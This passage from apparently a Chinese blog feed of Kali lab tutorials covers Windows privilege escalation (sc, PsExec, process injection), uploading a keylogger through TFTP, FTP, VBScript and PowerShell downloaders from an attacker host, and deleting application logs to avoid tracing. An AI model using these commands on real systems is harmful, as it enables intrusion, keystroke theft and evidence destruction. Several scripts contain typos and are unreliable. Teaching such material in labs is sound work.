alt="image-20221224105303370"></p><p><img src="/2022/12/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%80%E3%80%91/image-20221224105448950.png" alt="image-20221224105448950"></p><blockquote><p>此时已经获得了system权限</p></blockquote></li><li><p>使explorer.exe进程改为system账号运行</p><p>首先杀死explorer.exe，接着使用system窗口启动explorer</p><p><img src="/2022/12/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%80%E3%80%91/image-20221224110259018.png" alt="image-20221224110259018"></p><blockquote><p>此时的账号变为了system账号，explorer进程改为system用户启动</p><p>此时启动执行任何操作都是system账号</p></blockquote></li></ul><h3 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h3><blockquote><p>sc命令：创建，删除，编辑，调整现有的系统服务</p></blockquote><ul><li><p>sc Create syscmd binPath&#x3D; “cmd &#x2F;K start” type&#x3D; own type&#x3D; interact</p><blockquote><p>Create    # 创建一个系统服务</p><p>syscmd   # 服务名称（随便起）</p><p>binPath   # 执行一个命令；binPath&#x3D; “cmd &#x2F;K start”表示重新启动一个命令的窗口</p><p>type         # 服务类型；own由启动账号所拥有的服务；interact交互式，非后台运行</p></blockquote><p><img src="/2022/12/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%80%E3%80%91/image-20221224111043834.png" alt="image-20221224111043834"></p><p><code>services.msc</code>查看服务</p><p><img src="/2022/12/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%80%E3%80%91/image-20221224111738805.png" alt="image-20221224111738805"></p><p><code>sc start syscmd</code>启动服务</p><p><img src="/2022/12/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%80%E3%80%91/image-20221224111900154.png" alt="image-20221224111900154"></p><blockquote><p>服务在默认的情况下调用system账号下启动，最终达到提权的目的</p></blockquote></li></ul><h3 id="Sysinternals-Suite"><a href="#Sysinternals-Suite" class="headerlink" title="Sysinternals Suite"></a>Sysinternals Suite</h3><blockquote><ul><li>windows系统提供的套件</li><li>下载地址<ul><li><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/">https://docs.microsoft.com/zh-cn/sysinternals/downloads/</a></li></ul></li></ul></blockquote><ul><li><p>PsExec.exe -i -s cmd</p><blockquote><p>-i # 启动交互模式</p><p>-s # 获取system权限</p></blockquote><p><img src="/2022/12/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%80%E3%80%91/image-20221224113522110.png" alt="image-20221224113522110"></p></li></ul><h2 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h2><blockquote><ul><li><p>原理</p><ul><li>将自己的进程注入到正在运行的 system 服务进程中，使其具有 system 账号权限（隐蔽性强）。</li></ul></li><li><p>pinjector.exe进程注入器</p><ul><li><a href="http://www.tarasco.org/security/Process_Injector/">http://www.tarasco.org/security/Process_Injector/</a></li></ul></li></ul></blockquote><ul><li><p>pinjector</p><blockquote><p>-l   #  枚举当前身份验证信息</p><p>-p  #  注入进程</p></blockquote><p><img src="/2022/12/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%80%E3%80%91/image-20221224114209862.png" alt="image-20221224114209862"></p><ul><li><p>pinjector.exe -l</p><blockquote><p>枚举出的进程都可以进行zhu’ru</p></blockquote></li></ul><p><img src="/2022/12/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%80%E3%80%91/image-20221224114440051.png" alt="image-20221224114440051"></p><ul><li><p>pinjector.exe -p 668 cmd 5555</p><blockquote><p>运行此进程是开放在本地端口上的，当其他系统使用nc等工具连接此端口时，此端口就会将cmd交给对方</p></blockquote></li></ul><p><img src="/2022/12/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%80%E3%80%91/image-20221224122850029.png" alt="image-20221224122850029"></p><p><img src="/2022/12/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%80%E3%80%91/image-20221224122933586.png" alt="image-20221224122933586"></p><blockquote><p>端口已经被侦听</p><p>此时进程列表当中不会被添加多余的进程，只是将自己的进程注入到原本正常的进程中，再开放一个端口，隐蔽性较高</p></blockquote></li><li><p>使用nc连接</p><p><img src="/2022/12/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%80%E3%80%91/image-20221224123428765.png" alt="image-20221224123428765"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-后渗透</title>
      <link href="/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/"/>
      <url>/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><blockquote><p>拿下目标服务器的shell后，避免管理员为漏洞打上补丁，之后就再也不能控制目标系统；由此，拿下目标主机shell后需要进行后渗透。</p><ul><li>上传工具</li><li>提权<ul><li>若是拿到普通用户权限需要进行提权</li></ul></li><li>擦除攻击痕迹<ul><li>防止溯源</li></ul></li><li>安装后门<ul><li>长期控制</li><li>Dump 密码</li><li>内网渗透</li></ul></li><li>后渗透阶段<ul><li>最大的挑战—防病毒软件</li><li>使用合法的远程控制软件</li></ul></li></ul></blockquote><h2 id="上传工具"><a href="#上传工具" class="headerlink" title="上传工具"></a>上传工具</h2><blockquote><p>若控制的系统是Linux系统，目标系统会默认安装netcat、curl、wget；拿下目标主机后使用默认安装的工具下载木马或者远程控制软件。</p><p>若控制的系统是Windows系统，缺少预装的下载工具。</p><p>（相对于windows，linux更加容易实现木马或者远程工具的下载与安装）</p></blockquote><h4 id="交互式与非交互式shell"><a href="#交互式与非交互式shell" class="headerlink" title="交互式与非交互式shell"></a>交互式与非交互式shell</h4><h5 id="非交互式shell"><a href="#非交互式shell" class="headerlink" title="非交互式shell"></a>非交互式shell</h5><p>（需要在windows系统下安装ftp服务）</p><p><img src="/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/image-20221222183511339.png" alt="image-20221222183511339"></p><blockquote><p>在已经进入到非交互型的shell中，接着进入下一个子命令后，进一步输入帐号密码时无法执行后面的操作</p></blockquote><h5 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h5><p><img src="/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/image-20221222184102500.png" alt="image-20221222184102500"></p><blockquote><p>在交互式shell中，可以正常执行后面的操作</p><p><strong>对于nc侦听到的非交互式shell中，无法正常执行后面的操作</strong>，因此需要上传能够获得完整的交互式shell的后门或者木马进而完全控制目标主机。</p></blockquote><h4 id="TFTP传输"><a href="#TFTP传输" class="headerlink" title="TFTP传输"></a>TFTP传输</h4><blockquote><p>XP、2003中已默认安装，Win7、2008以后的系统需要单独添加，但经常被边界防火墙过滤。主流为FTP，是因为基于UDP协议，明文传输，不支持身份验证（无需登录验证即可下载服务器文件）。</p><p>思路：</p><p>在kali主机中创建一个目录，把此目录指定为TFTP服务主目录，再拷贝一个后门或者木马程序拷贝到TFTP主目录，在windows端使用TFTP命令将后门或者木马程序下载下来。</p></blockquote><h5 id="kali主机配置tftp服务"><a href="#kali主机配置tftp服务" class="headerlink" title="kali主机配置tftp服务"></a>kali主机配置tftp服务</h5><pre class="line-numbers language-none"><code class="language-none">1、在kali主机创建TFTP主目录：mkdir &#x2F;tftp2、修改目录权限：chown -R nobody &#x2F;tftp&#x2F;    # 将所有者改成nobody，主目录中所有文件的属组都必须是nobody，这样才能被下载3、cp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;whoami.exe &#x2F;tftp   # 查看windows当前用户4、cp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;klogger.exe &#x2F;tftp  # 拷贝键盘记录器5、atftpd --daemon --port 69 &#x2F;tftp   #启动服务，--daemon表示以后台的方式启动，指定端口69，主目录tftp6、<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/image-20221222212118212.png" alt="image-20221222212118212"></p><p><img src="/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/image-20221222212149538.png" alt="image-20221222212149538"></p><blockquote><p>确保<code>tftp</code>服务是由<code>atftpd</code>这个进程所启动的</p></blockquote><h5 id="windows端下载后门程序"><a href="#windows端下载后门程序" class="headerlink" title="windows端下载后门程序"></a>windows端下载后门程序</h5><p>进入tftp</p><p><img src="/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/image-20221222212552123.png" alt="image-20221222212552123"></p><p>使用<code>tftp -i 192.168.216.176 get whoami.exe/klogger.exe</code>下载到windows端</p><p><img src="/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/image-20221222212846726.png" alt="image-20221222212846726"></p><p>查看是否传输到windows端</p><p><img src="/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/image-20221222213019782.png" alt="image-20221222213019782"></p><p><img src="/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/image-20221222213149745.png" alt="image-20221222213149745"></p><p>使用<code>tasklist</code>查看进程是否运行</p><p><img src="/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/image-20221222214127940.png" alt="image-20221222214127940"></p><p><img src="/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/image-20221222214115590.png" alt="image-20221222214115590"></p><p>其中使用<code>klogger.exe</code>时，必须是在对应权限用户敲击键盘之后才会记录文件；现在获取到的权限是system，而此时klogger.exe文件是在system权限下执行的，所以其他用户敲击键盘是不会记录的</p><p><img src="/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/image-20221222220205922.png" alt="image-20221222220205922"></p><blockquote><p>1.txt是在system权限下创建的，其中有一些字符，klogger并没有进行记录；之后在windows端使用administrator用户运行klogger，使klogger在administrator权限下运行，再随机敲击键盘会生成klooger.txt文件，其中记录了administrator用户的键盘记录信息。</p></blockquote><h4 id="FTP传输"><a href="#FTP传输" class="headerlink" title="FTP传输"></a>FTP传输</h4><p>kali安装FTP服务</p><pre class="line-numbers language-none"><code class="language-none">apt-get install pure-ftpd     # 安装pure-ftpd（vsftpd也可以）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置脚本（ftp1.sh）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">groupadd</span> ftpgroup<span class="token function">useradd</span> <span class="token parameter variable">-g</span> ftpgroup <span class="token parameter variable">-d</span> /dev/null <span class="token parameter variable">-s</span> /etc ftpuserpure-pw <span class="token function">useradd</span> <span class="token builtin class-name">test</span> <span class="token parameter variable">-u</span> ftpuser <span class="token parameter variable">-d</span> /ftphomepure-pw mkdb<span class="token builtin class-name">cd</span> /etc/pure-ftpd/auth/<span class="token function">ln</span> <span class="token parameter variable">-s</span> <span class="token punctuation">..</span>/conf/PureDB 60pdb<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /ftphome<span class="token function">chown</span> <span class="token parameter variable">-R</span> ftpuser:ftpgroup /ftphome/       <span class="token comment">#创建的ftp主目录</span>/etc/init.d/pure-ftpd restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行脚本</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;ftp1.sh # 由于脚本中会添加用户，执行过程中需要为创建的用户输入密码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传后门</p><pre class="line-numbers language-none"><code class="language-none">ls &#x2F;ftphome&#x2F;cp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;whoami.exe &#x2F;ftphome&#x2F;cp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;klogger.exe &#x2F;ftphome&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>由于目前获得的shell是非交互模式的，ftp传输时，在password命令处无法显示，所以当前直接利用ftp下载是行不通的；</p><p>思路：</p><p>将要执行的命令写到目标服务器的文本文件中，windows上执行ftp命令读取文本文件的命令进行下载。</p></blockquote><p>上传文件</p><pre class="line-numbers language-none"><code class="language-none">C:\&gt;echo open 192.168.216.176 21&gt;ftp.txt     C:\&gt;echo test&gt;&gt;ftp.txtC:\&gt;echo password&gt;&gt;ftp.txt　　　　# password是前面设置的密码C:\&gt;echo bin&gt;&gt;ftp.txt            # bin表示使用二进制的传输方式传输C:\&gt;echo GET whoami.exe &gt;&gt; ftp.txtC:\&gt;echo GET klogger.exe &gt;&gt; ftp.txtC:\&gt;echo bye &gt;&gt; ftp.txtC:\&gt;type ftp.txt        # type命令查看ftp.txt内容type ftp.txtopen 192.168.216.176 21testpasswordbinGET whoami.exe GET klogger.exe bye C:\&gt;ftp -s:ftp.txt    # ftp -s表示让ftp调用文本文件中的命令去执行C:\&gt;whoami whoamiNT AUTHORITY\SYSTEM<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>步骤是和TFTP是一样的，唯一不同的就是tftp是交互型shell，ftp是非交互型shell</p></blockquote><h4 id="Vbscript传输"><a href="#Vbscript传输" class="headerlink" title="Vbscript传输"></a>Vbscript传输</h4><blockquote><p>VBS是windows系统上默认的解释型脚本语言，在win7后增加了perl，通过web程序，http协议下载远程控制程序。</p></blockquote><p>启动kali自带的Apache服务</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;init.d&#x2F;apache2 start     &#x2F;etc&#x2F;init.d&#x2F;apache2 status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/image-20221222230848419.png" alt="image-20221222230848419"></p><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;var&#x2F;www&#x2F;html&#x2F;cp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;klogger.exe &#x2F;var&#x2F;www&#x2F;htmlcp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;whoami.exe &#x2F;var&#x2F;www&#x2F;html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>上传文件（wget.vbs）</p><pre class="line-numbers language-none"><code class="language-none">echo strUrl &#x3D; WScript.Arguments.Item(0) &gt; wget.vbsecho StrFile &#x3D; WScript.Arguments.Item(1) &gt;&gt; wget.vbsecho Const HTTPREQUEST_PROXSEITTING_DEFAULT &#x3D; 0 &gt;&gt; wget.vbsecho Const HTTPREQUEST_PROXSEITTING_PRECONFIG &#x3D; 0 &gt;&gt; wget.vbsecho Const HTTPREQUEST_PROXSEITTING_DIRECT &#x3D; 1 &gt;&gt; wget.vbsecho Const HTTPREQUEST_PROXSEITTING_PROXY &#x3D; 2 &gt;&gt; wget.vbsecho Dim http, varByteArray, strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbsecho Err.Clear &gt;&gt; wget.vbsecho Set http &#x3D; Nothing &gt;&gt; wget.vbsecho Set http &#x3D; CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbsecho If http Is Noting Then Set http &#x3D; CreateObjiect(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbsecho If http Is Noting Then Set http &#x3D; CreateObjiect(&quot;WinHttp.MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbsecho If http Is Noting Then Set http &#x3D; CreateObjiect(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbsecho http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbsecho http.Send &gt;&gt; wget.vbsecho varByteArray &#x3D; http.ResponseBody &gt;&gt; wget.vbsecho Set http &#x3D; Noting &gt;&gt; wget.vbsecho Set fs &#x3D; CreateObject(&quot;Scrippting.FileSystemObject&quot;) &gt;&gt; wget.vbsecho Set ts &#x3D; fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbsecho strData &#x3D; &quot;&quot; &gt;&gt; wget.vbsecho strBuffer &#x3D; &quot;&quot; &gt;&gt; wget.vbsecho For lngCounter &#x3D; 0 to UBound(varByteArray) &gt;&gt; wget.vbsecho ts.Write Chr(255 And Ascb(Miidb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbsecho Next &gt;&gt; wget.vbsecho ts.Close &gt;&gt; wget.vbs#以上命令分批次传输，不要一次性传输，可能会传输不完整<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/image-20221222232609425.png" alt="image-20221222232609425"></p><blockquote><p>vbscript也是一种解释性脚本语言，需要使用windows自带的cscript命令调用vbscript脚本</p></blockquote><p>使用以下命令下载后门文件</p><pre class="line-numbers language-none"><code class="language-none">cscript wget.vbs http:&#x2F;&#x2F;192.168.216.176&#x2F;whoami.exe whoami.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="POWERSHELL传输"><a href="#POWERSHELL传输" class="headerlink" title="POWERSHELL传输"></a>POWERSHELL传输</h4><blockquote><p>类似vbs的传输，依旧是通过web服务,http协议到目标服务器下载程序，注意需在win7,win8以后的系统运行。后缀必须命名成<code>ps1</code>。</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$strongeDir</span> = <span class="token variable">$pwd</span><span class="token variable">$webclient</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token variable">$url</span> = <span class="token string">"http://192.168.216.176/whoami.exe"</span><span class="token variable">$file</span> = <span class="token string">"new-exsploit.exe"</span>  <span class="token comment"># 下载下来存到本地的文件名</span><span class="token variable">$webclient</span> DownloadFile<span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/image-20221222235034885.png" alt="image-20221222235034885"></p><p>使用以下命令下载</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -ExecutionPolicy Bypass  -NoLogo -Nonlnteractive -Noprofile -File wget.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注意：在win7以后的系统里才会有powershell</p></blockquote><h2 id="擦除痕迹"><a href="#擦除痕迹" class="headerlink" title="擦除痕迹"></a>擦除痕迹</h2><blockquote><p>以Slmail为例</p></blockquote><p>打开C:\Program Files\SLmail\System文件夹，其中有应用程序日志，随便打开一个 应用程序日志，会发现有很多条日志发送了很多‘A’，对于管理员来说很容易发现主机是被入侵了</p><p><img src="/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/image-20221222173848312.png" alt="image-20221222173848312"></p><p>使用kali打开相应应用程序目录删除对应的日志文件即可</p><p><img src="/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/image-20221223000934591.png" alt="image-20221223000934591"></p>]]></content>
      
      
      <categories>
          
          <category> 后渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 后渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-缓冲区溢出【Windows】</title>
      <link href="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/"/>
      <url>/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0Day"><a href="#0Day" class="headerlink" title="0Day"></a>0Day</h2><blockquote><p>零日漏洞</p><ul><li>未被官方所发现和公开</li><li>只掌握在个人手里</li></ul><p>缓冲区</p><ul><li>又称为缓存，它是内存空间的一部分</li><li>内存空间中预留了一定的存储空间，这些存储空间用来缓冲输入或输出的数据，这部分预留的空间就叫做缓冲区。</li></ul><p>缓冲区溢出</p><p>缓冲区溢出</p><ul><li><p>0Day中最主要的攻击方式</p></li><li><p>控制目标机器</p></li><li><p>原理：当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑爆”，从而覆盖了相邻内存区域的数据；若成功修改内存数据，可造成进程劫持，执行恶意代码，获取服务器控制权等后果。</p><p><a href="https://www.cnblogs.com/fanzhidongyzby/archive/2013/08/10/3250405.html">https://www.cnblogs.com/fanzhidongyzby/archive/2013/08/10/3250405.html</a></p></li></ul></blockquote><h2 id="如何发现漏洞"><a href="#如何发现漏洞" class="headerlink" title="如何发现漏洞"></a>如何发现漏洞</h2><blockquote><ul><li>源码审计<ul><li>拿到源码检查相应的安全漏洞</li></ul></li><li>逆向工程<ul><li>只能得到安装包，拿不到源码，对安装包进行逆向工程，反汇编</li></ul></li><li>模糊测试<ul><li>向程序堆栈半随机的数据，根据内存变化判断溢出</li><li>数据生成器：生成随机，半随机数据</li><li>测试工具：识别溢出漏洞</li></ul></li></ul></blockquote><h2 id="Windows缓冲区溢出"><a href="#Windows缓冲区溢出" class="headerlink" title="Windows缓冲区溢出"></a>Windows缓冲区溢出</h2><blockquote><p><strong>实验环境：</strong></p><ol><li>kali</li><li>windows _xp_sp3</li></ol><p><strong>工具：</strong></p><ol><li>SLMail 5.5.0 Mail Server（邮件服务器）<ul><li>下载地址：<a href="https://slmail.software.informer.com/download/#downloading">https://slmail.software.informer.com/download/#downloading</a></li></ul></li><li>ImmunityDebugger_1_85_setup.exe（动态调试工具）<ul><li>下载地址：<a href="https://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/Immunity-Debugger.shtml">https://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/Immunity-Debugger.shtml</a></li></ul></li><li>mona.py<ul><li>下载地址：<a href="https://github.com/corelan/mona">https://github.com/corelan/mona</a></li><li>使用手册：<a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/">https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/</a></li></ul></li><li>RegSnap<ul><li>下载地址：<a href="https://www.onlinedown.net/soft/38491.html">https://www.onlinedown.net/soft/38491.html</a></li></ul></li></ol><p>注：win7以上系统完整的支持操作系统安全防护机制，若是进行溢出就需要绕过安全防护机制，本实验主要是对于溢出过程的了解与掌握。</p></blockquote><h3 id="SLMail-5-5-0-Mail-Server-安装"><a href="#SLMail-5-5-0-Mail-Server-安装" class="headerlink" title="SLMail 5.5.0 Mail Server 安装"></a>SLMail 5.5.0 Mail Server 安装</h3><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219202133901.png" alt="image-20221219202133901"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219202148572.png" alt="image-20221219202148572"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219202723048.png" alt="image-20221219202723048"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219202753309.png" alt="image-20221219202753309"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219202807296.png" alt="image-20221219202807296"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219202911874.png" alt="image-20221219202911874"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219202935993.png" alt="image-20221219202935993"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219203000556.png" alt="image-20221219203000556"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219203037407.png" alt="image-20221219203037407"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219203048003.png" alt="image-20221219203048003"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219203133377.png" alt="image-20221219203133377"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219203221840.png" alt="image-20221219203221840"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219203314217.png" alt="image-20221219203314217"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219203440701.png" alt="image-20221219203440701"></p><h3 id="ImmunityDebugger-1-85-setup-exe的安装"><a 